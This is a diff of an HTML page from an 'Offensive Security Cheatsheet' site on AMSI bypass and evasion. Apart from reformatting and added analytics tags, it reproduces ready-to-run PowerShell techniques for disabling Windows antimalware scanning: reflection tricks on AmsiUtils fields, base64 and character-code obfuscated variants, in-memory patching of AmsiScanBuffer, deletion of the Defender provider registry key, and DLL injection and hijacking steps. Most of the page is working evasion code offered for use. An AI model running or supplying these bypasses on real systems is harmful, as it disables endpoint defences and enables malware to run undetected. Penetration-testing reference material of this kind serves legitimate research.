@@ -5,7 +5,7 @@
     
       <meta charset="utf-8">
 <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1, user-scalable=no">
-<meta name="revised" content="2022-09-11T16:52:53 CEST">
+<meta name="revised" content="2023-02-14T12:07:01 CET">
 <title>AMSI Bypass and Evasion :: Offensive Security Cheatsheet</title>
 <link rel="shortcut icon" href="/images/favicon.png" type="image/x-icon" />
 <link href="/css/font-awesome.min.css" rel="stylesheet">
@@ -27,7 +27,36 @@
     
       <header>
   <div class="logo">
-    <a class="baselink" href="/">Offensive Security Cheatsheet</a>
+    <head>
+  
+<script type="application/javascript">
+var doNotTrack = false;
+if (!doNotTrack) {
+	(function(i,s,o,g,r,a,m){i['GoogleAnalyticsObject']=r;i[r]=i[r]||function(){
+	(i[r].q=i[r].q||[]).push(arguments)},i[r].l=1*new Date();a=s.createElement(o),
+	m=s.getElementsByTagName(o)[0];a.async=1;a.src=g;m.parentNode.insertBefore(a,m)
+	})(window,document,'script','https://www.google-analytics.com/analytics.js','ga');
+	ga('create', 'G-Q5C993721K', 'auto');
+	
+	ga('send', 'pageview');
+}
+</script>
+
+  
+<script type="application/javascript">
+var doNotTrack = false;
+if (!doNotTrack) {
+	window.ga=window.ga||function(){(ga.q=ga.q||[]).push(arguments)};ga.l=+new Date;
+	ga('create', 'G-Q5C993721K', 'auto');
+	
+	ga('send', 'pageview');
+}
+</script>
+<script async src='https://www.google-analytics.com/analytics.js'></script>
+
+</head>
+<a class="baselink" href="/">Offensive Security Cheatsheet</a>
+
   </div>
   <div class="burger"><a href="javascript:void(0);" style="font-size:15px;">&#9776;</a></div>
     <nav class="shortcuts">
@@ -1833,9 +1862,7 @@
     
     
     
-    
-
-<h3 id="resources">Resources</h3>
+    <h3 id="resources">Resources</h3>
 <div class="highlight"><pre style="color:#272822;background-color:#fafafa;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash"><span style="color:#75715e"># AMSI Bypass Methods</span>
 https://pentestlaboratories.com/2021/05/17/amsi-bypass-methods/amp/
 https://www.contextis.com/us/blog/amsi-bypass
@@ -1845,24 +1872,26 @@ https://fatrodzianko.com/2020/08/25/getting-rastamouses-amsiscanbufferbypass-to-
 https://sensepost.com/blog/2020/resurrecting-an-old-amsi-bypass/
 
 <span style="color:#75715e"># AMSI Bypass generator</span>
-https://amsi.fail/</code></pre></div>
-<p><br/></p>
-
+https://amsi.fail/
+</code></pre></div><!-- raw HTML omitted -->
 <h3 id="amsi-bypass-methods">AMSI Bypass Methods</h3>
 <div class="highlight"><pre style="color:#272822;background-color:#fafafa;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash"><span style="color:#75715e"># Methods pulled from the previous mentionned resources</span>
 <span style="color:#75715e"># More details on the resources</span>
 
 <span style="color:#75715e"># 1. Powershell Downgrade</span>
 <span style="color:#75715e"># Older version of powershell doesn&#39;t use AMIS</span>
-powershell -version <span style="color:#ae81ff">2</span></code></pre></div><div class="highlight"><pre style="color:#272822;background-color:#fafafa;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash"><span style="color:#75715e"># 2. Base64 Encoding</span>
+powershell -version <span style="color:#ae81ff">2</span>
+</code></pre></div><div class="highlight"><pre style="color:#272822;background-color:#fafafa;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash"><span style="color:#75715e"># 2. Base64 Encoding</span>
 <span style="color:#75715e"># Original AMSI Bypass</span>
 PS&gt; <span style="color:#f92672">[</span>Ref<span style="color:#f92672">]</span>.Assembly.GetType<span style="color:#f92672">(</span><span style="color:#d88200">&#39;System.Management.Automation.AmsiUtils&#39;</span><span style="color:#f92672">)</span>.GetField<span style="color:#f92672">(</span><span style="color:#d88200">&#39;amsiInitFailed&#39;</span>,<span style="color:#d88200">&#39;NonPublic,Static&#39;</span><span style="color:#f92672">)</span>.SetValue<span style="color:#f92672">(</span><span style="color:#111">$null</span>,<span style="color:#111">$true</span><span style="color:#f92672">)</span>
 
 <span style="color:#75715e"># Base64 encoded</span>
-PS&gt; <span style="color:#f92672">[</span>Ref<span style="color:#f92672">]</span>.Assembly.GetType<span style="color:#f92672">(</span><span style="color:#d88200">&#39;System.Management.Automation.&#39;</span>+<span style="color:#00a8c8">$(</span><span style="color:#f92672">[</span>Text.Encoding<span style="color:#f92672">]</span>::Unicode.GetString<span style="color:#f92672">([</span>Convert<span style="color:#f92672">]</span>::FromBase64String<span style="color:#f92672">(</span><span style="color:#d88200">&#39;QQBtAHMAaQBVAHQAaQBsAHMA&#39;</span><span style="color:#00a8c8">)</span><span style="color:#f92672">)))</span>.GetField<span style="color:#f92672">(</span><span style="color:#00a8c8">$(</span><span style="color:#f92672">[</span>Text.Encoding<span style="color:#f92672">]</span>::Unicode.GetString<span style="color:#f92672">([</span>Convert<span style="color:#f92672">]</span>::FromBase64String<span style="color:#f92672">(</span><span style="color:#d88200">&#39;YQBtAHMAaQBJAG4AaQB0AEYAYQBpAGwAZQBkAA==&#39;</span><span style="color:#00a8c8">)</span><span style="color:#f92672">))</span>,<span style="color:#d88200">&#39;NonPublic,Static&#39;</span><span style="color:#f92672">)</span>.SetValue<span style="color:#f92672">(</span><span style="color:#111">$null</span>,<span style="color:#111">$true</span><span style="color:#f92672">)</span></code></pre></div><div class="highlight"><pre style="color:#272822;background-color:#fafafa;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash"><span style="color:#75715e"># 3. Hooking</span>
+PS&gt; <span style="color:#f92672">[</span>Ref<span style="color:#f92672">]</span>.Assembly.GetType<span style="color:#f92672">(</span><span style="color:#d88200">&#39;System.Management.Automation.&#39;</span>+<span style="color:#00a8c8">$(</span><span style="color:#f92672">[</span>Text.Encoding<span style="color:#f92672">]</span>::Unicode.GetString<span style="color:#f92672">([</span>Convert<span style="color:#f92672">]</span>::FromBase64String<span style="color:#f92672">(</span><span style="color:#d88200">&#39;QQBtAHMAaQBVAHQAaQBsAHMA&#39;</span><span style="color:#00a8c8">)</span><span style="color:#f92672">)))</span>.GetField<span style="color:#f92672">(</span><span style="color:#00a8c8">$(</span><span style="color:#f92672">[</span>Text.Encoding<span style="color:#f92672">]</span>::Unicode.GetString<span style="color:#f92672">([</span>Convert<span style="color:#f92672">]</span>::FromBase64String<span style="color:#f92672">(</span><span style="color:#d88200">&#39;YQBtAHMAaQBJAG4AaQB0AEYAYQBpAGwAZQBkAA==&#39;</span><span style="color:#00a8c8">)</span><span style="color:#f92672">))</span>,<span style="color:#d88200">&#39;NonPublic,Static&#39;</span><span style="color:#f92672">)</span>.SetValue<span style="color:#f92672">(</span><span style="color:#111">$null</span>,<span style="color:#111">$true</span><span style="color:#f92672">)</span>
+</code></pre></div><div class="highlight"><pre style="color:#272822;background-color:#fafafa;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash"><span style="color:#75715e"># 3. Hooking</span>
 
 <span style="color:#75715e"># The DLL needs to be injected into the PowerShell process which the AMSI bypass will performed</span>
-.<span style="color:#8045ff">\S</span>impleInjector.exe powershell.exe .<span style="color:#8045ff">\A</span>msiHook.dll</code></pre></div><div class="highlight"><pre style="color:#272822;background-color:#fafafa;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash"><span style="color:#75715e"># 4. Memory Patching</span>
+.<span style="color:#8045ff">\S</span>impleInjector.exe powershell.exe .<span style="color:#8045ff">\A</span>msiHook.dll
+</code></pre></div><div class="highlight"><pre style="color:#272822;background-color:#fafafa;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash"><span style="color:#75715e"># 4. Memory Patching</span>
 https://gist.github.com/am0nsec/986db36000d82b39c73218facc557628
 PS&gt; <span style="color:#f92672">[</span>System.Reflection.Assembly<span style="color:#f92672">]</span>::LoadFile<span style="color:#f92672">(</span><span style="color:#d88200">&#34;C:\Users\pentestlab\ASBBypass.dll&#34;</span><span style="color:#f92672">)</span>
 PS&gt; <span style="color:#f92672">[</span>Amsi<span style="color:#f92672">]</span>::Bypass<span style="color:#f92672">()</span>
@@ -1876,7 +1905,7 @@ Add-Type <span style="color:#d88200">${</span><span style="color:#111">_</span><
 <span style="color:#d88200">${</span><span style="color:#111">__</span><span style="color:#111">/=</span><span style="color:#8045ff">\/</span><span style="color:#111">==</span><span style="color:#8045ff">\/\_</span><span style="color:#111">/=</span><span style="color:#8045ff">\_</span><span style="color:#111">/</span><span style="color:#d88200">}</span> <span style="color:#f92672">=</span> <span style="color:#f92672">[</span>Win32<span style="color:#f92672">]</span>::LoadLibrary<span style="color:#f92672">(</span><span style="color:#d88200">&#34;am&#34;</span> + <span style="color:#00a8c8">$(</span><span style="color:#f92672">[</span>Text.Encoding<span style="color:#f92672">]</span>::Unicode.GetString<span style="color:#f92672">([</span>Convert<span style="color:#f92672">]</span>::FromBase64String<span style="color:#f92672">(</span><span style="color:#d88200">&#39;cwBpAC4AZABsAGwA&#39;</span><span style="color:#00a8c8">)</span><span style="color:#f92672">)))</span>
 <span style="color:#d88200">${</span><span style="color:#111">___</span><span style="color:#111">/====</span><span style="color:#8045ff">\_</span><span style="color:#111">_</span><span style="color:#111">/=====</span><span style="color:#d88200">}</span> <span style="color:#f92672">=</span> <span style="color:#f92672">[</span>Win32<span style="color:#f92672">]</span>::GetProcAddress<span style="color:#f92672">(</span><span style="color:#d88200">${</span><span style="color:#111">__</span><span style="color:#111">/=</span><span style="color:#8045ff">\/</span><span style="color:#111">==</span><span style="color:#8045ff">\/\_</span><span style="color:#111">/=</span><span style="color:#8045ff">\_</span><span style="color:#111">/</span><span style="color:#d88200">}</span>, <span style="color:#00a8c8">$(</span><span style="color:#f92672">[</span>Text.Encoding<span style="color:#f92672">]</span>::Unicode.GetString<span style="color:#f92672">([</span>Convert<span style="color:#f92672">]</span>::FromBase64String<span style="color:#f92672">(</span><span style="color:#d88200">&#39;QQBtAHMAaQA=&#39;</span><span style="color:#00a8c8">)</span><span style="color:#f92672">))</span> + <span style="color:#00a8c8">$(</span><span style="color:#f92672">[</span>Text.Encoding<span style="color:#f92672">]</span>::Unicode.GetString<span style="color:#f92672">([</span>Convert<span style="color:#f92672">]</span>::FromBase64String<span style="color:#f92672">(</span><span style="color:#d88200">&#39;UwBjAGEAbgA=&#39;</span><span style="color:#00a8c8">)</span><span style="color:#f92672">))</span> + <span style="color:#00a8c8">$(</span><span style="color:#f92672">[</span>Text.Encoding<span style="color:#f92672">]</span>::Unicode.GetString<span style="color:#f92672">([</span>Convert<span style="color:#f92672">]</span>::FromBase64String<span style="color:#f92672">(</span><span style="color:#d88200">&#39;QgB1AGYAZgBlAHIA&#39;</span><span style="color:#00a8c8">)</span><span style="color:#f92672">)))</span>
 <span style="color:#d88200">${</span><span style="color:#111">/==</span><span style="color:#8045ff">\_</span><span style="color:#111">/=</span><span style="color:#8045ff">\/\_</span><span style="color:#111">_</span><span style="color:#111">/</span><span style="color:#8045ff">\/\/</span><span style="color:#d88200">}</span> <span style="color:#f92672">=</span> <span style="color:#ae81ff">0</span>
-<span style="color:#f92672">[</span>Win32<span style="color:#f92672">]</span>::VirtualProtect<span style="color:#f92672">(</span><span style="color:#d88200">${</span><span style="color:#111">___</span><span style="color:#111">/====</span><span style="color:#8045ff">\_</span><span style="color:#111">_</span><span style="color:#111">/=====</span><span style="color:#d88200">}</span>, <span style="color:#f92672">[</span>uint32<span style="color:#f92672">]</span><span style="color:#ae81ff">5</span>, 0x40, <span style="color:#f92672">[</span>ref<span style="color:#f92672">]</span><span style="color:#d88200">${</span><span style="color:#111">/==</span><span style="color:#8045ff">\_</span><span style="color:#111">/=</span><span style="color:#8045ff">\/\_</span><span style="color:#111">_</span><span style="color:#111">/</span><span style="color:#8045ff">\/\/</span><span style="color:#d88200">}</span><span style="color:#f92672">)</span>
+<span style="color:#f92672">[</span>Win32<span style="color:#f92672">]</span>::VirtualProtect<span style="color:#f92672">(</span><span style="color:#d88200">${</span><span style="color:#111">___</span><span style="color:#111">/====</span><span style="color:#8045ff">\_</span><span style="color:#111">_</span><span style="color:#111">/=====</span><span style="color:#d88200">}</span>, <span style="color:#f92672">[</span>uint32<span style="color:#f92672">]</span>5, 0x40, <span style="color:#f92672">[</span>ref<span style="color:#f92672">]</span><span style="color:#d88200">${</span><span style="color:#111">/==</span><span style="color:#8045ff">\_</span><span style="color:#111">/=</span><span style="color:#8045ff">\/\_</span><span style="color:#111">_</span><span style="color:#111">/</span><span style="color:#8045ff">\/\/</span><span style="color:#d88200">}</span><span style="color:#f92672">)</span>
 <span style="color:#d88200">${</span><span style="color:#111">_</span><span style="color:#111">/</span><span style="color:#8045ff">\_</span><span style="color:#111">_</span><span style="color:#111">/=</span><span style="color:#8045ff">\/\_</span><span style="color:#111">__</span><span style="color:#111">/==</span><span style="color:#8045ff">\}</span><span style="color:#111"> = [Byte[]] (0xB8, 0x57, 0x00, 0x07, 0x80, 0xC3)
 </span><span style="color:#111">[System.Runtime.InteropServices.Marshal]::</span><span style="color:#111">Copy</span><span style="color:#111">(</span><span style="color:#d88200">${</span><span style="color:#111">_</span><span style="color:#111">/</span><span style="color:#8045ff">\_</span><span style="color:#111">_</span><span style="color:#111">/=</span><span style="color:#8045ff">\/\_</span><span style="color:#111">__</span><span style="color:#111">/==</span><span style="color:#8045ff">\}</span><span style="color:#111">, 0, </span><span style="color:#d88200">${</span><span style="color:#111">___</span><span style="color:#111">/====</span><span style="color:#8045ff">\_</span><span style="color:#111">_</span><span style="color:#111">/=====</span><span style="color:#d88200">}</span><span style="color:#111">, 6)
 </span><span style="color:#111">
@@ -1885,31 +1914,34 @@ Add-Type <span style="color:#d88200">${</span><span style="color:#111">_</span><
 </span><span style="color:#111">
 </span><span style="color:#111"># Another method is described here
 </span><span style="color:#111">https://fatrodzianko.com/2020/08/25/getting-rastamouses-amsiscanbufferbypass-to-work-again/
-</span><span style="color:#111">https://www.contextis.com/us/blog/amsi-bypass</span></code></pre></div><div class="highlight"><pre style="color:#272822;background-color:#fafafa;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash"><span style="color:#75715e"># 5. Forcing an Error</span>
-<span style="color:#111">$mem</span> <span style="color:#f92672">=</span> <span style="color:#f92672">[</span>System.Runtime.InteropServices.Marshal<span style="color:#f92672">]</span>::AllocHGlobal<span style="color:#f92672">(</span><span style="color:#ae81ff">9076</span><span style="color:#f92672">)</span>
+</span><span style="color:#111">https://www.contextis.com/us/blog/amsi-bypass
+</span></code></pre></div><div class="highlight"><pre style="color:#272822;background-color:#fafafa;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash"><span style="color:#75715e"># 5. Forcing an Error</span>
+<span style="color:#111">$mem</span> <span style="color:#f92672">=</span> <span style="color:#f92672">[</span>System.Runtime.InteropServices.Marshal<span style="color:#f92672">]</span>::AllocHGlobal<span style="color:#f92672">(</span>9076<span style="color:#f92672">)</span>
 <span style="color:#f92672">[</span>Ref<span style="color:#f92672">]</span>.Assembly.GetType<span style="color:#f92672">(</span><span style="color:#d88200">&#34;System.Management.Automation.AmsiUtils&#34;</span><span style="color:#f92672">)</span>.GetField<span style="color:#f92672">(</span><span style="color:#d88200">&#34;amsiContext&#34;</span>,<span style="color:#d88200">&#34;NonPublic,Static&#34;</span><span style="color:#f92672">)</span>.SetValue<span style="color:#f92672">(</span><span style="color:#111">$null</span>, <span style="color:#f92672">[</span>IntPtr<span style="color:#f92672">]</span><span style="color:#111">$mem</span><span style="color:#f92672">)</span>
 <span style="color:#f92672">[</span>Ref<span style="color:#f92672">]</span>.Assembly.GetType<span style="color:#f92672">(</span><span style="color:#d88200">&#34;System.Management.Automation.AmsiUtils&#34;</span><span style="color:#f92672">)</span>.GetField<span style="color:#f92672">(</span><span style="color:#d88200">&#34;amsiSession&#34;</span>,<span style="color:#d88200">&#34;NonPublic,Static&#34;</span><span style="color:#f92672">)</span>.SetValue<span style="color:#f92672">(</span><span style="color:#111">$null</span>, <span style="color:#111">$null</span><span style="color:#f92672">)</span><span style="color:#111">;</span>
 
 <span style="color:#75715e"># Obfuscated version</span>
-<span style="color:#111">$fwi</span><span style="color:#f92672">=[</span>System.Runtime.InteropServices.Marshal<span style="color:#f92672">]</span>::AllocHGlobal<span style="color:#f92672">((</span><span style="color:#ae81ff">9076</span>+8092-8092<span style="color:#f92672">))</span><span style="color:#111">;</span><span style="color:#f92672">[</span>Ref<span style="color:#f92672">]</span>.Assembly.GetType<span style="color:#f92672">(</span><span style="color:#d88200">&#34;System.Management.Automation.</span><span style="color:#00a8c8">$(</span><span style="color:#f92672">[</span>cHAr<span style="color:#f92672">](</span><span style="color:#ae81ff">65</span><span style="color:#00a8c8">)</span><span style="color:#d88200">+[cHaR]([byTe]0x6d)+[ChaR]([ByTe]0x73)+[CHaR]([BYte]0x69)+[CHaR](85*31/31)+[cHAR]([byte]0x74)+[cHAR](105)+[cHar](108)+[Char](115+39-39))&#34;</span><span style="color:#f92672">)</span>.GetField<span style="color:#f92672">(</span><span style="color:#d88200">&#34;</span><span style="color:#00a8c8">$(</span><span style="color:#d88200">&#39;àmsìSessîõn&#39;</span>.NoRMALiZe<span style="color:#f92672">([</span>char<span style="color:#f92672">](</span><span style="color:#ae81ff">70</span>+54-54<span style="color:#00a8c8">)</span><span style="color:#d88200">+[cHaR](111)+[cHar](114+24-24)+[chaR](106+3)+[chAR](68+26-26)) -replace [CHAR](24+68)+[chaR]([BytE]0x70)+[CHar]([bYtE]0x7b)+[cHAr](77+45-45)+[chaR](62+48)+[CHAR](125*118/118))&#34;</span>, <span style="color:#d88200">&#34;NonPublic,Static&#34;</span><span style="color:#f92672">)</span>.SetValue<span style="color:#f92672">(</span><span style="color:#111">$null</span>, <span style="color:#111">$null</span><span style="color:#f92672">)</span><span style="color:#111">;</span><span style="color:#f92672">[</span>Ref<span style="color:#f92672">]</span>.Assembly.GetType<span style="color:#f92672">(</span><span style="color:#d88200">&#34;System.Management.Automation.</span><span style="color:#00a8c8">$(</span><span style="color:#f92672">[</span>cHAr<span style="color:#f92672">](</span><span style="color:#ae81ff">65</span><span style="color:#00a8c8">)</span><span style="color:#d88200">+[cHaR]([byTe]0x6d)+[ChaR]([ByTe]0x73)+[CHaR]([BYte]0x69)+[CHaR](85*31/31)+[cHAR]([byte]0x74)+[cHAR](105)+[cHar](108)+[Char](115+39-39))&#34;</span><span style="color:#f92672">)</span>.GetField<span style="color:#f92672">(</span><span style="color:#d88200">&#34;</span><span style="color:#00a8c8">$(</span><span style="color:#f92672">[</span>char<span style="color:#f92672">]([</span>bYtE<span style="color:#f92672">]</span>0x61<span style="color:#00a8c8">)</span><span style="color:#d88200">+[ChaR]([BYte]0x6d)+[Char](55+60)+[chAr](105+97-97)+[CHAr]([byTe]0x43)+[ChaR](111+67-67)+[char]([BytE]0x6e)+[cHaR]([bYtE]0x74)+[cHAr](101)+[CHar](120)+[cHAR](116))&#34;</span>, <span style="color:#d88200">&#34;NonPublic,Static&#34;</span><span style="color:#f92672">)</span>.SetValue<span style="color:#f92672">(</span><span style="color:#111">$null</span>, <span style="color:#f92672">[</span>IntPtr<span style="color:#f92672">]</span><span style="color:#111">$fwi</span><span style="color:#f92672">)</span><span style="color:#111">;</span></code></pre></div><div class="highlight"><pre style="color:#272822;background-color:#fafafa;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash"><span style="color:#75715e"># 6. Registry Key Modification</span>
+<span style="color:#111">$fwi</span><span style="color:#f92672">=[</span>System.Runtime.InteropServices.Marshal<span style="color:#f92672">]</span>::AllocHGlobal<span style="color:#f92672">((</span>9076+8092-8092<span style="color:#f92672">))</span><span style="color:#111">;</span><span style="color:#f92672">[</span>Ref<span style="color:#f92672">]</span>.Assembly.GetType<span style="color:#f92672">(</span><span style="color:#d88200">&#34;System.Management.Automation.</span><span style="color:#00a8c8">$(</span><span style="color:#f92672">[</span>cHAr<span style="color:#f92672">](</span>65<span style="color:#00a8c8">)</span><span style="color:#d88200">+[cHaR]([byTe]0x6d)+[ChaR]([ByTe]0x73)+[CHaR]([BYte]0x69)+[CHaR](85*31/31)+[cHAR]([byte]0x74)+[cHAR](105)+[cHar](108)+[Char](115+39-39))&#34;</span><span style="color:#f92672">)</span>.GetField<span style="color:#f92672">(</span><span style="color:#d88200">&#34;</span><span style="color:#00a8c8">$(</span><span style="color:#d88200">&#39;àmsìSessîõn&#39;</span>.NoRMALiZe<span style="color:#f92672">([</span>char<span style="color:#f92672">](</span>70+54-54<span style="color:#00a8c8">)</span><span style="color:#d88200">+[cHaR](111)+[cHar](114+24-24)+[chaR](106+3)+[chAR](68+26-26)) -replace [CHAR](24+68)+[chaR]([BytE]0x70)+[CHar]([bYtE]0x7b)+[cHAr](77+45-45)+[chaR](62+48)+[CHAR](125*118/118))&#34;</span>, <span style="color:#d88200">&#34;NonPublic,Static&#34;</span><span style="color:#f92672">)</span>.SetValue<span style="color:#f92672">(</span><span style="color:#111">$null</span>, <span style="color:#111">$null</span><span style="color:#f92672">)</span><span style="color:#111">;</span><span style="color:#f92672">[</span>Ref<span style="color:#f92672">]</span>.Assembly.GetType<span style="color:#f92672">(</span><span style="color:#d88200">&#34;System.Management.Automation.</span><span style="color:#00a8c8">$(</span><span style="color:#f92672">[</span>cHAr<span style="color:#f92672">](</span>65<span style="color:#00a8c8">)</span><span style="color:#d88200">+[cHaR]([byTe]0x6d)+[ChaR]([ByTe]0x73)+[CHaR]([BYte]0x69)+[CHaR](85*31/31)+[cHAR]([byte]0x74)+[cHAR](105)+[cHar](108)+[Char](115+39-39))&#34;</span><span style="color:#f92672">)</span>.GetField<span style="color:#f92672">(</span><span style="color:#d88200">&#34;</span><span style="color:#00a8c8">$(</span><span style="color:#f92672">[</span>char<span style="color:#f92672">]([</span>bYtE<span style="color:#f92672">]</span>0x61<span style="color:#00a8c8">)</span><span style="color:#d88200">+[ChaR]([BYte]0x6d)+[Char](55+60)+[chAr](105+97-97)+[CHAr]([byTe]0x43)+[ChaR](111+67-67)+[char]([BytE]0x6e)+[cHaR]([bYtE]0x74)+[cHAr](101)+[CHar](120)+[cHAR](116))&#34;</span>, <span style="color:#d88200">&#34;NonPublic,Static&#34;</span><span style="color:#f92672">)</span>.SetValue<span style="color:#f92672">(</span><span style="color:#111">$null</span>, <span style="color:#f92672">[</span>IntPtr<span style="color:#f92672">]</span><span style="color:#111">$fwi</span><span style="color:#f92672">)</span><span style="color:#111">;</span>
+</code></pre></div><div class="highlight"><pre style="color:#272822;background-color:#fafafa;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash"><span style="color:#75715e"># 6. Registry Key Modification</span>
 <span style="color:#75715e"># AMSI Providers are responsible for the scanning process by the antivirus product and are</span>
 <span style="color:#75715e"># registered in a location in the registry. The GUID for Windows Defender is displayed below</span>
 HKLM:<span style="color:#8045ff">\S</span>OFTWARE<span style="color:#8045ff">\M</span>icrosoft<span style="color:#8045ff">\A</span>MSI<span style="color:#8045ff">\P</span>roviders<span style="color:#8045ff">\{</span>2781761E-28E0-4109-99FE-B9D127C57AFE<span style="color:#f92672">}</span>
 
 <span style="color:#75715e"># You can remove the key</span>
 <span style="color:#75715e"># Requires elevated privileges</span>
-<span style="color:#75715e"># Not a stealth move</span> 
-Remove-Item -Path <span style="color:#d88200">&#34;HKLM:\SOFTWARE\Microsoft\AMSI\Providers\{2781761E-28E0-4109-99FE-B9D127C57AFE}&#34;</span> -Recurse</code></pre></div><div class="highlight"><pre style="color:#272822;background-color:#fafafa;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash"><span style="color:#75715e"># 7. DLL Hijacking</span>
+<span style="color:#75715e"># Not a stealth move </span>
+Remove-Item -Path <span style="color:#d88200">&#34;HKLM:\SOFTWARE\Microsoft\AMSI\Providers\{2781761E-28E0-4109-99FE-B9D127C57AFE}&#34;</span> -Recurse
+</code></pre></div><div class="highlight"><pre style="color:#272822;background-color:#fafafa;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash"><span style="color:#75715e"># 7. DLL Hijacking</span>
 https://sensepost.com/blog/2020/resurrecting-an-old-amsi-bypass/
 
 <span style="color:#75715e"># Once the DLL is created</span>
 <span style="color:#75715e"># Executing PowerShell outside of the standard directory will load the amsi.dll file</span>
-<span style="color:#75715e"># which contains all the necessary functions to operate, however AMSI will not initiated.</span> 
+<span style="color:#75715e"># which contains all the necessary functions to operate, however AMSI will not initiated. </span>
 
 <span style="color:#75715e"># Example</span>
 C:<span style="color:#8045ff">\U</span>sers<span style="color:#8045ff">\m</span>yuser<span style="color:#8045ff">\D</span>ocuments<span style="color:#8045ff">\a</span>msi.dll
-C:<span style="color:#8045ff">\U</span>sers<span style="color:#8045ff">\m</span>yuser<span style="color:#8045ff">\D</span>ocuments<span style="color:#8045ff">\p</span>owershell.exe</code></pre></div>
-<h3 id="wip">WIP</h3>
+C:<span style="color:#8045ff">\U</span>sers<span style="color:#8045ff">\m</span>yuser<span style="color:#8045ff">\D</span>ocuments<span style="color:#8045ff">\p</span>owershell.exe
+</code></pre></div><h3 id="wip">WIP</h3>
 
 
     
